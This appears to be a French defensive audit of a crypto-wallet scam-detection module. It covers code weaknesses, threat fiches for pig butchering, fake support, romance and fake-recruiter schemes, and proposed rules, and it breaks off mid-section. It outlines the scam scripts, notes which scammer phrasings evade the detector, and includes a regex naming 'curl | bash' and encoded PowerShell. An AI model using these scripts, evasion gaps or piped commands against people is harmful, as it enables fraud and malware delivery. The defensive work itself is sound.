# 05 — Manipulation humaine : la tx est « normale », on a menti à l'utilisateur

Famille : l'utilisateur signe en connaissance de cause une transaction dont les effets sont exactement ceux qu'il croit avoir demandés. Le mensonge est en amont (qui est la contrepartie, pourquoi payer, ce qui se passera après). Le comparateur « intention vs effets » n'a donc, par construction, presque rien à comparer. Ce qui reste exploitable : l'identité et l'historique de la contrepartie, la forme de la tx par rapport à l'historique de l'utilisateur, le message collé, et la façon dont l'utilisateur formule son intention.

Code audité : `C:\Users\Adem\wt\T-103\app\intent\src\` (`compare.ts`, `classifyMessage.ts`, `parseIntent.ts`, `providers/keyword.ts`, `types.ts`), commit `f37712a`. J'ai exécuté le code réel (providers/keyword.ts + compare.ts) sur les messages et scénarios ci-dessous ; les colonnes « aujourd'hui » sont des résultats mesurés, pas des suppositions. Les chaînes Cloudflare/Jev n'ont pas été testées (pas de clé) : tout ce qui suit vaut pour le fallback keyword, qui sera le chemin de la démo hors ligne.

Statut des chiffres : tirés de recherches web le 11 oct. 2026 (articles de presse spécialisée relayant IC3, Chainalysis, TRM, CertiK, FTC). Je n'ai pas ouvert les PDF primaires. Avant de les mettre dans la fiche de défense, vérifier sur ic3.gov, chainalysis.com, ftc.gov.

---

## 0. Constats transverses sur le code (mesurés)

| # | Constat | Preuve | Gravité |
|---|---|---|---|
| C1 | `compare()` ne lit jamais `intent.pastedMessage`, `intent.askedBy`, ni aucun label de `classifyMessage`. Le classifieur de message et le comparateur sont deux modules sans pont dans les fichiers audités. Un message « Coinbase fraud dept » collé ne change pas le verdict d'une tx `pay_someone`. | `grep pastedMessage compare.ts` = 0 occurrence | Critique |
| C2 | `confidence` est une constante `1.0` dans `compare()` : la confiance du parseur d'intention (0.3 quand aucun mot-clé ne matche) n'est jamais propagée, donc la règle `low_confidence` ne se déclenche jamais. | `let confidence = 1.0` jamais modifié | Haute |
| C3 | `pay_someone` ne vérifie PAS `firstSeenByUser`. Seul `send_to_my_account` le fait. Un paiement vers une adresse jamais vue, sans `counterpartyAddress` déclarée, ne déclenche aucune règle de destinataire (`wrong_recipient` exige `intent.counterpartyAddress`). | scénarios S1, S6, S7, S12 = `ok` | Critique |
| C4 | `new_contract` : seuil de 50 blocs, commenté « ~10 min sur la plupart des chaînes ». Faux : ~10 min sur Ethereum L1 (12 s/bloc), ~12 s sur Arbitrum (0,25 s/bloc), ~100 s sur BSC/Polygon. Un domaine de scam dure des jours. Un contrat de 20 min sur L2 ou de 1 h sur L1 passe. | S9, S9b = `ok` | Haute |
| C5 | `high_balance_share` : seuil 50 %, niveau `warn` seulement. Un transfert « tout vers le wallet sécurisé » à 95 % du solde donne `warn`, qui ne bloque pas. À 40 % : `ok`. Les pertes moyennes (Chainalysis : 2 764 USD par paiement en 2025) sont loin de 50 % d'un solde de victime fortunée. | S3 `warn`, S3b `ok`, S8 `warn` | Haute |
| C6 | Le parseur d'intention est facile à orienter par l'escroc (via le vocabulaire qu'il met dans la bouche de la victime) : « déposer sur mon compte de trading » donne `send_to_my_account` (règle `first_seen_recipient` critique : bon par accident) ; « vers un portefeuille sécurisé » donne `connect_or_accept_offer` conf 0.3 (tout outgoing = critique : bon par accident) ; « send to a safe wallet » donne `pay_someone` (aucune règle : trou) ; « pay the tax to the compliance wallet » donne `pay_someone` (trou). | sortie du parseur, voir §3 | Haute |
| C7 | Le montant extrait est le premier nombre du texte (`AMOUNT_PATTERN`) : « Léa m'a écrit à 14h, envoie 250 USDC » extrait 14. La règle `amount_exceeded` est unilatérale (tx > déclaré) : fausse alerte critique ou, inversement, un déclaré trop haut laisse passer. | lecture de `parseIntent.ts` | Moyenne |
| C8 | Classifieur keyword : labels limités à 6 (pas de `advance_fee`, `authority`, `recovery`, `romance`, `coercion`, `phishing_site`) ; 22 messages d'arnaque sur 27 de ma famille classés `legit` à confiance 0.50 ; `getWarningMessage` affiche pour ces `legit` conf 0.5 « Message légitime (confiance faible: 50 %) », c'est-à-dire ni alerte ni rassurant. | §4 | Critique |
| C9 | Faux positifs du classifieur : le motif d'injection `(dis|say|answer|respond…) .* (ok|legit|safe…)` n'a pas de `\b` interne : « Dis à Paul que son token est arrivé » et « Please say hi to Marie, the book is ready » donnent `fake_support` 0.90 (le « ok » de token/book). « Feel free to send me the free tickets » et « Happy birthday! Here's a gift » donnent `fake_refund_or_gift`. Un vrai message du support MetaMask qui dit « We will never ask for your Secret Recovery Phrase » donne `seed_phishing` 0.65 (pas de gestion de la négation). | `fp.mjs`, M30 | Haute |
| C10 | `\b(recrut\|hiring\|embauche)\b` : « Nous recrutons » ne matche pas (le `\b` après `recrut` échoue sur `recrutons`). Le français « recrutement/recruteur » est rate. | test direct | Moyenne |
| C11 | `imageBase64` est ignoré par le provider keyword (`_imageBase64`). Les arnaques arrivent en capture d'écran (Telegram, appli « plateforme » en image). | lecture | Moyenne |
| C12 | Un « compte propre » est défini par `firstSeenByUser` seul. Après une première validation (l'utilisateur clique « c'est bien le mien »), la seconde tx vers la même adresse passe `ok` (S2b). Pig butchering et « wallet sécurisé » sont des séquences : la barrière se désarme elle-même. | S2b | Haute |

Corollaire honnête : sur cette famille, **le comparateur seul est quasi aveugle (3 scénarios sur 16 en `critical`, tous dus à `asked_by_someone`, `first_seen` en « mon compte » ou délégation 7702)**. La valeur doit venir (a) du pont message-tx (C1), (b) de la réputation et de l'âge réels de la contrepartie, (c) d'une question ciblée qui fait dire à l'utilisateur ce que l'escroc lui a demandé de cacher, (d) d'un délai de réflexion sur les gros montants vers une contrepartie nouvelle.

---

## 1. Tableau récapitulatif

Légende couverture : **O** couvert, **P** partiel / par accident, **N** non couvert, **X** indétectable à l'échelle de la tx (la mitigation est ailleurs).

| ID | Menace | Tx vue par la barrière | Couvert aujourd'hui | Meilleur signal exploitable | Friction proposée | Priorité |
|---|---|---|---|---|---|---|
| M-01 | Pig butchering / fausse plateforme d'investissement | transfert ERC-20/ETH vers une adresse « de dépôt » | P (seulement si l'user dit « mon compte » et 1re tx) | contrepartie jamais vue + message avec rendement/mentor + escalade des montants + adresse sans historique exchange | Question « qui t'a donné cette adresse et pourquoi ? » ; délai 1 h au-dessus du p90 perso | P0 |
| M-02 | Frais pour débloquer le retrait / « taxe » / dépôt de vérification | transfert vers l'adresse de la même plateforme ou une nouvelle | N | séquence : dépôts précédents + tx suivante pour « débloquer » ; mots `retrait bloqué`, `taxe`, `frais de déblocage` | Blocage doux avec script de démasquage (« aucun vrai service ne facture pour libérer vos fonds ») | P0 |
| M-03 | Faux support exchange/wallet (Coinbase, Ledger, MetaMask) « compte compromis, transférez » | transfert de la quasi-totalité vers une adresse neuve | P (si `asked_by_someone` ou « mon compte ») | `asked_by_someone` + part du solde élevée + adresse neuve + message (secret, urgence) | `critical` sans bouton « continuer » immédiat | P0 |
| M-04 | « Wallet compromis, mettez vos fonds à l'abri » (l'adresse sûre est celle de l'escroc, souvent générée par lui) | transfert vers adresse neuve que l'user croit sienne | P | preuve de possession absente ; adresse fournie par un tiers ; sweep > 50 % | Preuve de possession (signature depuis l'adresse ou présence dans le keyring) sinon `critical` | P0 |
| M-05 | Faux recruteur Lazarus « Contagious Interview » / ClickFix | aucune tx au moment du vol ; la clé est exfiltrée, le vol est signé ailleurs | X (tx) / N (message) | message collé : test technique, dépôt GitHub, `curl \| bash`, caméra non détectée | Alerte sur le message + conseil hors tx (machine dédiée) | P1 (hors scope tx, scope message) |
| M-06 | Romance / « confiance » | transferts répétés vers des adresses nouvelles | N | tag `relationship_money_request` + contrepartie jamais vue + montants croissants | Question douce, délai de réflexion | P1 |
| M-07 | Ami piraté, faux proche, deepfake voix/vidéo, faux dirigeant | paiement vers une adresse nouvelle pour un contact connu | N | contact connu mais adresse NON liée à ce contact + urgence/secret | Vérification hors canal (« appelle sur le numéro que tu connais ») | P1 |
| M-08 | Faux airdrop / mint via compte X ou Discord compromis | signature (permit/approve/setApprovalForAll) ou `claim()` payable vers un contrat récent | O pour approvals/outgoing sous `connect`; N pour signature opaque | domaine jeune, contrat < 7 j, `claim` demandant un paiement | déjà `critical` si effet visible | P1 (couvert si le moteur d'effets décode) |
| M-09 | Recovery scam (« je récupère vos fonds volés ») | petit paiement d'avance | N | tag `recovery_fee` ; l'user a un historique récent de perte (adresse poisoning/drain) | Blocage doux | P1 |
| M-10 | Fausse autorité (fisc, police, « escrow gouvernemental ») | transfert vers une adresse « Trésor » | N | tag `authority` + secret + délai court | `critical` sans continuer immédiat | P1 |
| M-11 | Wrench attack / coercition | transfert « normal » de tout ou presque, souvent vers adresse fraîche, parfois en plusieurs étapes | X (indétectable avec certitude) ; P pour warn à 95 % | sweep soudain, adresse neuve, heure/lieu atypiques, délai | Time-lock sur nouvelle destination + code de contrainte (duress PIN) : voir fiche | P2 (conception produit) |
| M-12 | Faux bots Telegram de trading / « sniper » / copy-trading | envoi à un « contrat de pool » ou import de clé privée | P (approve/permit) / N (envoi ETH) | adresse/contrat jeune, aucun code vérifié, rendement garanti, demande de clé privée | Alerte message + blocage si contrat non vérifié | P1 |
| M-13 | Clone de swap en pub Google (Uniswap/MetaMask/Ledger) | permit/permit2/approve illimité vers un spender jeune | P (`unlimited_approval_swap` warn ; `permit_new_contract` seulement < 50 blocs) | domaine < 30 jours, origine ≠ liste blanche, spender non listé | `critical` pour permit illimité + spender inconnu | P0 |
| M-14 | Seed phrase saisie sur un faux site (Ledger Live, MetaMask) | aucune tx : la saisie est hors portefeuille | X (barrière tx) ; message O | message collé ; détection BIP-39 dans un champ web (extension) | Alerte à la saisie | P1 (hors tx) |

---

## 2. Principes de conception (ce qui survit à un praticien)

1. **Ne jamais compter sur l'intention seule.** Un escroc qui coache la victime lui fait déclarer exactement l'intention qui passe (« payer ma plateforme 1 500 USDC »). Il faut croiser quatre sources indépendantes de l'escroc : (a) historique de l'utilisateur, (b) réputation/âge/forme de la contrepartie, (c) message collé, (d) réponse à une question que l'escroc n'a pas répétée.
2. **Fusion message x tx.** Règle générale : *un tag de manipulation dans le message ET une contrepartie nouvelle ET un montant significatif => critical*. Chaque élément seul est trop bruité (message : beaucoup de faux positifs ; contrepartie nouvelle : très fréquent ; montant : dépend du profil).
3. **Montant relatif au profil**, pas au solde : `amount_usd / p90(30 derniers transferts sortants de l'utilisateur)` et `amount_usd > 10 x median`. 50 % du solde ne dit rien pour un user qui a 200 USD ou 2 M USD.
4. **Friction proportionnée** (échelle utilisée dans les fiches) :
   - F0 : rien.
   - F1 : une question ciblée à choix (1 clic, moins de 5 s), dont certaines réponses font monter le niveau.
   - F2 : délai de réflexion (10 min à 24 h) avec possibilité de contacter un proche de confiance pré-déclaré.
   - F3 : `critical` : bouton « continuer » masqué derrière un délai et une phrase à retaper (pas un simple clic).
5. **Budget de fatigue** : cible mesurable < 1 friction F1+ par 20 tx pour un utilisateur « normal » sur le corpus synthétique ; F2/F3 < 1 par mois. Le taux de contournement par l'utilisateur (clic « continuer ») doit être mesuré : s'il dépasse 60 % sur une règle, la règle est trop bruyante ou mal formulée.
6. **Les réponses à la question sont un signal** : « Je ne sais pas » ou « Quelqu'un me l'a demandé » => escalade ; « C'est mon adresse, je l'ai créée moi-même » sans preuve de possession => ne suffit pas pour M-04.
7. **Ce qui est indétectable doit être dit** : sur la fiche de défense, annoncer que la barrière ne remplace pas ni la sensibilisation ni le time-lock (wrench). C'est l'objection qu'un jury posera.

### Données à ajouter à `Effects` / contexte (proposé, non implémenté)

```ts
interface CounterpartyIntel {            // enrichissement par le moteur d'effets
  firstSeenAtMs?: number;                // vrai âge en temps, pas en blocs
  txCount?: number;
  fanInSenders?: number;                 // nb d'expéditeurs distincts sur 30 j (adresse collectrice)
  fundedByLabel?: 'cex_hot_wallet'|'mixer'|'bridge'|'unknown';
  label?: 'cex_deposit'|'cex_hot'|'known_dapp'|'scam_list'|'sanctioned'|'none';
  verifiedSource?: boolean;              // contrat vérifié (Sourcify/Etherscan)
  ownershipProven?: boolean;             // adresse dans le keyring/hardware connecté, ou signature d'un challenge
}
interface UserHistory { p90UsdOut30d: number; medianUsdOut30d: number; txCountTo(addr): number; lastSeenToAddr(addr): number }
interface MessageTags { unlockFee, safeAddress, authority, secrecy, urgency, guaranteedReturn, relationshipMoneyRequest, recoveryFee, remoteCommand, coercion: boolean }
```

Sources de données gratuites ou à bas coût compatibles « pas d'action contre un système réel » : listes publiques (ScamSniffer scam-database, MetaMask `eth-phishing-detect`, Chainabuse, OFAC SDN), Sourcify pour la vérification de contrat, labels Etherscan (limités), Forta/GoPlus selon licence. Pour la démo : fixtures synthétiques.

---

## 3. Fiches par menace

Convention des identifiants de test : `Mxx` = message (§4), `Sxx` = scénario d'effets (§5).

### M-01 Pig butchering / fausse plateforme d'investissement

- **Script de l'escroc.** (1) Contact « raté » (SMS, WhatsApp, Telegram, dating). (2) Semaines de confiance. (3) Un « mentor/oncle » parle d'une plateforme à gains réguliers ; l'appli (clone) affiche des gains. (4) Petit dépôt, petit retrait qui réussit (test). (5) Dépôts de plus en plus gros vers l'adresse affichée par l'appli. (6) Retrait bloqué : voir M-02. L'adresse de dépôt change parfois à chaque dépôt.
- **Chiffres + sources.** IC3 2025 : fraude à l'investissement crypto = 7,2 Md USD de pertes aux États-Unis, 11,37 Md USD de pertes totales liées à la crypto, 181 565 plaintes ; plus de 60 ans : ~7,7 Md USD tous types ([HSToday, 2026](https://www.hstoday.us/subject-matter-areas/cybersecurity/cryptocurrency-and-ai-scams-cost-u-s-almost-21-billion-in-2025-according-to-new-fbi-internet-crime-report/)). IC3 2024 : 5,8 Md USD en fraude à l'investissement crypto, 9,3 Md USD crypto au total ([CyberScoop](https://cyberscoop.com/fbi-ic3-cybercrime-report-2024-key-statistics-trends/)). Chainalysis 2026 : >= 14 Md USD de revenus de scams on-chain en 2025 (estimation >17 Md), paiement moyen passé de 782 USD (2024) à 2 764 USD (2025), scams liés à des vendeurs d'IA 4,5 fois plus rentables ([Cointelegraph](https://cointelegraph.com/news/crypto-scams-2025-ai-impersonation-fraud-chainalysis)). TRM : 35 Md USD envoyés vers des adresses de scammers en 2025, usage de LLM x5 ([Cointelegraph](https://www.cointelegraph.com/news/ai-enabled-crypto-scams-rise-500-percent)). Note : une grande partie des dépôts de pig butchering passe par USDT sur Tron, hors périmètre MetaMask/EVM ; la barrière ne couvre que la part EVM (BSC, Ethereum, L2).
- **Ce que voit la barrière.** Un `transfer` ERC-20 simple vers un EOA ou un contrat de dépôt, montant modeste, part de solde faible, contrepartie jamais vue. Aucun approve. C'est une tx banale.
- **Couvert aujourd'hui ?** Partiel, par accident. S1 (`pay_someone`) = `ok`. S2 (même tx, intention « déposer sur mon compte de trading » -> `send_to_my_account`) = `critical first_seen_recipient`, mais uniquement pour la première tx : S2b (deuxième dépôt) = `ok` (C12). `compare.ts` : `checkPaySomeone` n'a aucun test de première vue (C3).
- **Signal / règle (pseudo-code).**
```
if intent.kind in [pay_someone, send_to_my_account, buy_or_swap?] and effects.outgoing.length>0:
  cp = firstOutgoingCounterparty
  novel = cp.firstSeenByUser
  big   = usd > max(150, 3*history.p90UsdOut30d)         // relatif au profil
  noCex = cp.label != 'cex_deposit' and cp.label != 'known_dapp'
  escalating = history.sumUsdTo(cp, 14d) > 0 and usd > 1.5*history.lastUsdTo(cp)   // escalade vers la même contrepartie
  tags = classifyTags(intent.pastedMessage)
  if novel and noCex and big and (tags.guaranteedReturn or tags.relationshipMoneyRequest or intent.askedBy): critical
  elif novel and noCex and big: warn(F1 question A)
  elif escalating and (history.txCountTo(cp)>=2) and noCex: warn(F2 delai 60 min, question B)
```
Le seuil 150 USD est un exemple ; à calibrer sur la distribution des tx du corpus.
- **Question à poser (F1).** « Qui t'a donné cette adresse, et tu l'as rencontré(e) en ligne ? » Réponses : *Moi / mon propre exchange* (ok), *Un ami que je connais en vrai* (warn léger), *Quelqu'un rencontré en ligne, un conseiller, une plateforme* (critical). Deuxième question en cas d'escalade : « As-tu déjà retiré de l'argent de cette plateforme sans payer de frais ? »
- **Objection + parade.** *« Un utilisateur qui paie un nouveau fournisseur légitime se fait harceler à chaque fois. »* Parade : la question n'apparaît que si la contrepartie est nouvelle ET le montant dépasse 3 x p90 perso ET ce n'est pas un exchange/dapp labellisé ; les contreparties confirmées par l'utilisateur (carnet d'adresses > 7 j) sont exemptées. *« L'escroc coachera la réponse. »* Parade : la question porte sur la rencontre en ligne ; la victime n'ose pas toujours mentir à un écran neutre, mais on assume une perte de rappel (voir « indétectable »).
- **Risque FP / fatigue.** Moyen. Estimé 1 à 3 % des tx d'un utilisateur retail actif (achats OTC, paiements à un freelance). À mesurer sur le corpus ; si > 5 %, relever le seuil 3 x p90 en 5 x.
- **Cas de test.** M01, M02, M13, M23, M24 ; S1, S2, S2b.
- **Mapping.** ATT&CK : T1566 (Phishing, via service T1566.003), T1656 (Impersonation), T1657 (Financial Theft), T1585 (Establish Accounts, faux profils). D3FEND : D3-UBA (User Behavior Analysis). NIST CSF 2.0 : DE.AE-02 (événements défavorables analysés), DE.AE-03 (corrélation de sources), DE.CM-03 (activité des utilisateurs surveillée), RS.MI-01 (confinement). OWASP ASI / ATLAS : n/a pour la tx ; AML.T0051 seulement pour l'injection dans le message collé.

### M-02 « Frais / taxe / dépôt de vérification » pour débloquer le retrait

- **Script.** La plateforme affiche un solde gonflé ; au retrait : « impôt de 20 % », « dépôt de vérification de solvabilité », « frais de conformité AML ». Chaque paiement est suivi d'un nouveau motif. Le même schéma sert le recovery scam (M-09).
- **Chiffres.** IC3 2025 : les victimes se voient demander frais ou taxes avant retrait (même source que M-01). Chainalysis note la convergence des types de scam. Pas de chiffre isolé fiable pour le seul « advance fee » : ne pas en inventer.
- **Ce que voit la barrière.** Un transfert vers l'adresse de la plateforme (souvent déjà vue : dépôts précédents), avec une intention déclarée « payer la taxe de retrait ».
- **Couvert ?** Non. `parseIntent` : « pay the tax … to the compliance wallet » -> `pay_someone`; aucun test. M03 et M04 classés `legit` 0.50 (aucun motif ne couvre `taxe`, `unlock`, `retrait bloqué`).
- **Règle.**
```
tags = classifyTags(pastedMessage) ∪ keywordTags(intent.freeText)
// mots: retrait bloqué|débloquer|taxe|impôt|frais de conformité|dépôt de vérification|withdrawal fee|unlock|tax to withdraw|compliance wallet|verification deposit
if tags.unlockFee and outgoing.length>0: critical   // aucun contexte légitime ne demande de payer pour retirer ses propres fonds
if history.sumUsdTo(cp, 90d) > 0 and cp.label=='none' and recentOutflowsToSameCp >= 2 and tags.any: critical
```
- **Question (F3, une seule).** « Le service te demande-t-il de payer avant de te rendre ton argent ? » Oui => texte fixe : « Aucun service sérieux ne fait payer pour rendre ton argent. Arrête, ne paie rien. » + lien vers signalement.
- **Objection + parade.** *« Un vrai exchange peut demander une taxe/KYC. »* Parade : les vraies taxes se déclarent au fisc, pas on-chain vers une adresse fournie par chat ; pour les frais de réseau (gas) le wallet les gère. Le seul vrai cas : frais de retrait *prélevés* sur le solde, jamais *envoyés par l'utilisateur à part*. FP résiduel : l'user paie des frais légitimes OTC ; la friction F3 reste surmontable (retaper une phrase).
- **FP / fatigue.** Faible : le tag est très spécifique. Le risque principal est lexical (négations : « no fee to withdraw »).
- **Cas de test.** M03, M04, M17, M18, M19 ; S6.
- **Mapping.** ATT&CK : T1566, T1656, T1657. D3FEND : D3-UBA. NIST CSF 2.0 : DE.AE-02, RS.MI-01.

### M-03 Faux support exchange/wallet (Coinbase, Ledger, MetaMask)

- **Script.** Appel ou SMS du « service anti-fraude » avec des données exactes de la victime (nom, solde, 4 derniers chiffres) : accès non autorisé détecté ; « ne raccrochez pas » ; « ne dites rien à votre banque, il y a des complices internes » ; transfert vers un « wallet sécurisé » créé par l'escroc, souvent avec guidance de pull-up d'app (installer un wallet, générer une seed que l'escroc a déjà ou que la victime lui dicte).
- **Chiffres.** Coinbase a divulgué en mai 2025 que des agents de support externalisés avaient été soudoyés pour extraire des données clients (< 1 % des utilisateurs mensuels), rançon de 20 M USD refusée, coût estimé 180 à 400 M USD ([The Block](https://www.theblock.co/post/354479/coinbase-estimates-180m-to-400m-in-costs-tied-to-customer-data-breach-filing) ; [TechRadar](https://www.techradar.com/pro/security/coinbase-reveals-insider-breach-did-take-place-customer-info-compromised)). Chainalysis : incidents d'impersonation +1 400 % en 2025 (par rapport à 2024), montants moyens +600 %, exemple d'un schéma « Coinbase » ayant pris près de 16 M USD ([Cointelegraph](https://cointelegraph.com/news/crypto-scams-2025-ai-impersonation-fraud-chainalysis)). FTC : 86 % des pertes via distributeurs BTC au premier semestre 2024 relevaient d'impersonation gouvernement/entreprise/support technique ; 110 M USD en 2023, 65 M USD au premier semestre 2024, médiane 10 000 USD ([FTC](https://ftc.gov/news-events/news/press-releases/2024/09/new-ftc-data-shows-massive-increase-losses-bitcoin-atm-scams)).
- **Barrière.** Transfert de 80 à 100 % du solde vers une adresse neuve. L'utilisateur déclare « mon compte », « un wallet sécurisé » ou « Coinbase m'a demandé ».
- **Couvert ?** Oui sous condition de bon routage de l'intention. `asked_by_someone` + outgoing = `critical` (S4) ; « le support Coinbase m'a demandé… » -> bien `asked_by_someone` (testé). « transférer vers un portefeuille sécurisé » -> `connect_or_accept_offer` conf 0.3, outgoing => `critical` (accident). « send to a safe wallet » -> `pay_someone` -> `warn` à 95 %, `ok` à 40 % (S3, S3b). M05, M06 : classifieur `legit` 0.50 (C8).
- **Règle.**
```
if tags.authority_or_support and tags.safeAddress and outgoing>0: critical
if (tags.secrecy or tags.callInProgress) and outgoing>0 and cp.firstSeen: critical     // 'ne dis rien à personne' + tx
if shareOfBalancePct>=70 and cp.firstSeen and not ownershipProven(cp): critical        // sweep vers adresse non prouvée
// quel que soit l'intent déclaré, tout sweep >=70% vers une adresse non prouvée passe au moins en F2
```
- **Question (F1/F3).** « Es-tu en ligne avec quelqu'un en ce moment (appel, chat) qui te guide dans cette opération ? » Oui => critical. Texte de rupture : « Coinbase, Ledger, MetaMask ne t'appellent jamais pour déplacer tes fonds. Raccroche, rappelle le numéro officiel. »
- **Objection + parade.** *« Un utilisateur qui migre vers un nouveau Ledger sera bloqué. »* Parade : preuve de possession (signature d'un challenge depuis la nouvelle adresse sur l'appareil, ou adresse dans la liste de comptes du portefeuille/hardware connecté) lève le blocage ; sinon délai F2 de 30 min avec notification à un proche (option). *« L'attaquant fait générer la seed à la victime sur un faux site/appli. »* Parade : le wallet « sécurisé » est une adresse que le keyring MetaMask de l'utilisateur ne contient pas ; la seule preuve valable est la possession par la victime d'une clé qu'elle a générée elle-même, ce que l'escroc simule si l'user ouvre un faux Ledger Live : cas M-14, non couvert.
- **FP / fatigue.** Moyen-faible : concerne surtout les sweeps (rares).
- **Cas de test.** M05, M06, M16 ; S3, S3b, S4.
- **Mapping.** ATT&CK : T1656, T1566, T1598 (collecte d'infos), T1657. D3FEND : D3-UBA. NIST CSF 2.0 : DE.AE-02, DE.AE-03, RS.MI-01, RS.CO-03.

### M-04 « Wallet compromis, transférez vers un wallet sécurisé » (version in-app / DM)

- **Script.** Message sur Discord/Telegram/X : « notre monitoring a détecté que ton wallet est drainé ; un white-hat peut sauver les fonds, envoie-les à ce coffre ». Parfois suivi d'une demande d'importer la seed dans un « outil de récupération ».
- **Chiffres.** Même famille d'impersonation que M-03 (Chainalysis ci-dessus). ScamSniffer : 83,85 M USD de pertes par drainers en 2025 sur 106 106 victimes (-83 % vs 2024), perte moyenne 790 USD ([ScamSniffer](https://drops.scamsniffer.io/scam-sniffer-2025-crypto-phishing-losses-fall-83-to-84-million/)) : la menace d'infrastructure baisse, la manipulation monte.
- **Barrière.** Idem M-03 sans l'appel téléphonique. L'intention déclarée est typiquement « sécuriser mes fonds » -> parseur : `connect_or_accept_offer` 0.3 (outgoing => critique), ou `pay_someone` s'il écrit « envoyer ».
- **Couvert ?** Partiel. M16 classé `legit` 0.50 (aucun motif : `drained`, `white-hat`, `safe vault`).
- **Règle / question / objection.** Mêmes que M-03 ; ajouter un tag `safeAddress` (motifs : `portefeuille sécurisé|wallet sécurisé|safe wallet|secure wallet|vault|coffre|escrow|cold wallet fourni`) et un tag `compromised_claim` (`votre wallet est (compromis|piraté|drainé)|your wallet (is|has been) (hacked|compromised|drained)`). L'objection du praticien est que « sécurisé » est un mot normal : donc le tag ne déclenche qu'en conjonction avec un message tiers (`pastedMessage` non vide ou `askedBy` renseigné).
- **FP.** Faible si conjonction exigée.
- **Cas de test.** M16 ; S3.
- **Mapping.** ATT&CK : T1656, T1566.003, T1657. D3FEND : D3-UBA. NIST CSF : DE.AE-02, RS.MI-01.

### M-05 Faux recruteur Lazarus « Contagious Interview » / ClickFix

- **Script.** Approche LinkedIn/X/Telegram par un « recruteur » d'un exchange (Coinbase, Kraken, Robinhood, Bybit, eToro) ; entretien sur un site de visio factice ; « votre caméra n'est pas détectée, collez cette commande » (ClickFix) ou test technique = cloner un dépôt contenant du code malveillant (npm, backdoor GolangGhost, infostealer). But : voler seed, clés SSH, cookies, extension de wallet.
- **Chiffres.** Sekoia : 184 invitations analysées, 14 noms d'entreprises usurpées ; SentinelOne/Validin : au moins 230 personnes ciblées ; backdoor GolangGhost Windows/macOS ([The Hacker News](https://thehackernews.com/2025/04/lazarus-group-targets-job-seekers-with.html) ; [SecurityWeek](https://www.securityweek.com/north-korean-hackers-targeted-hundreds-in-fake-job-interview-attacks/amp/)). Lazarus a volé ~2 Md USD en 2023-2024 et 1,5 Md USD chez Bybit en mars 2025 (même source). Les ordres de grandeur de pertes *via* Contagious Interview spécifiquement ne sont pas publiés de façon fiable : ne pas en citer.
- **Barrière.** Rien au moment du vol : la clé est lue sur le disque ; la tx de vidage est signée par l'attaquant depuis son infrastructure, pas par le portefeuille de la victime. La barrière tx est hors-jeu (**X**). Il reste le **message**.
- **Couvert ?** Message : partiel. `fake_job` ne matche que `hiring`, `work from home`, `commission`, etc. M09 (« recruiter… clone this repo and run npm install ») classé `legit` 0.50 ; M10 (`curl … | bash`) idem ; M11 (FR « nous recrutons ») idem (C10). Aucune règle sur `remoteCommand`.
- **Règle.**
```
tags.remoteCommand = /(curl|wget)[^\n]*\|\s*(ba)?sh|powershell\s+-(enc|nop)|npm (install|i)\b.*&&|git clone .*&&|paste (this|the following) (in|into) (your )?(terminal|cmd)|colle(z)? cette commande|open (a )?terminal and/i
tags.interview = /(recruiter|recruteur|recrut(e|ons|ement)|hiring|entretien|interview|take-?home|test technique|coding challenge)/i
if tags.remoteCommand and tags.interview: label=fake_job, severity high  // l'association est rarissime en vrai
if tags.remoteCommand alone: warn("ne colle jamais de commande reçue par message")
```
- **Question (F1) à l'ouverture d'un message collé.** « Ce message te demande-t-il d'exécuter une commande ou de lancer du code ? » Oui => alerte forte : « utilise une machine séparée, jamais celle de ton wallet ; ne colle pas de commande ».
- **Objection + parade.** *« Les devs lancent `curl | bash` tous les jours (Homebrew, nvm). »* Parade : seul le couple recrutement + commande est un `critical` ; seul `curl|bash` seul = information discrète. Autre objection : *« Le vol n'est pas détectable par une barrière avant signature. »* Réponse honnête : exact, et la barrière ne le prétend pas ; on ne vend que la détection du message ; la mitigation structurelle est le hardware wallet et une machine dédiée.
- **FP.** Faible pour le couple ; moyen pour `curl|bash` seul (donc ne pas bloquer).
- **Cas de test.** M09, M10, M11.
- **Mapping.** ATT&CK : T1566.003, T1656 (usurpation de recruteur), T1204 (User Execution), T1204.004 (Malicious Copy and Paste, ATT&CK v17 ; à vérifier sur attack.mitre.org), T1059 (interpréteurs), T1555 / T1005 (vol de données). D3FEND : D3-PSA (Process Spawn Analysis), D3-EAL (Executable Allowlisting), D3-FA. NIST CSF 2.0 : DE.CM-03, DE.AE-02, PR.AT-01 (sensibilisation, approximation grand public), RS.MI-01. ATLAS : n/a.

### M-06 Romance (et « confiance » avant investissement)

- **Script.** Relation à distance, demande d'argent pour un imprévu (billet, douane, frais médicaux) ou introduction vers la plateforme (pig butchering). La demande est présentée comme un « service entre nous ».
- **Chiffres.** IC3 : plus de 60 ans, principaux perdants en crypto (~2,8 Md USD en 2024, ~7,7 Md USD tous types en 2025) ([CyberScoop](https://cyberscoop.com/fbi-ic3-cybercrime-report-2024-key-statistics-trends/)). Pas de chiffre robuste isolé « romance crypto » sur 2023-2026 que j'aie pu vérifier : ne pas en citer.
- **Barrière.** Transfert d'un montant raisonnable vers une adresse nouvelle ; l'utilisateur déclare « envoyer 400 USDT à ma copine ».
- **Couvert ?** Non. `pay_someone`, sans adresse de référence : `ok`. M12 `legit` 0.50 ; M13 `legit`.
- **Règle.** `if tags.relationshipMoneyRequest (je t'aime|baby|chéri|my love|stranded|bloqué à l'aéroport|just until tomorrow|jusqu'à demain) and outgoing>0 and cp.firstSeen: warn F2`. Escalade en `critical` si `history.relationshipPayments>=2` ou si l'user a déclaré « rencontré(e) en ligne ».
- **Question.** « As-tu déjà vu cette personne en vrai ou en visio en direct (pas une photo) ? » Réponse « non » => délai 24 h + « parles-en à un proche ».
- **Objection + parade.** *« Un couple légitime à distance existe. »* Parade : la barrière ne bloque pas, elle ralentit (F2) et nomme le schéma. Taux FP élevé en théorie mais volume faible.
- **FP / fatigue.** Faible volume ; risque de ton condescendant : rédiger neutre.
- **Cas de test.** M12, M13, M22.
- **Mapping.** ATT&CK : T1656, T1585.001 (comptes sur réseaux sociaux), T1657. D3FEND : D3-UBA. NIST CSF : DE.AE-02, RS.MI-01.

### M-07 Ami piraté, faux proche, deepfake voix/vidéo, faux dirigeant

- **Script.** Compte WhatsApp/Insta d'un proche piraté, ou voice-clone/visio deepfake d'un dirigeant : demande urgente de virement vers une nouvelle adresse « fournisseur ».
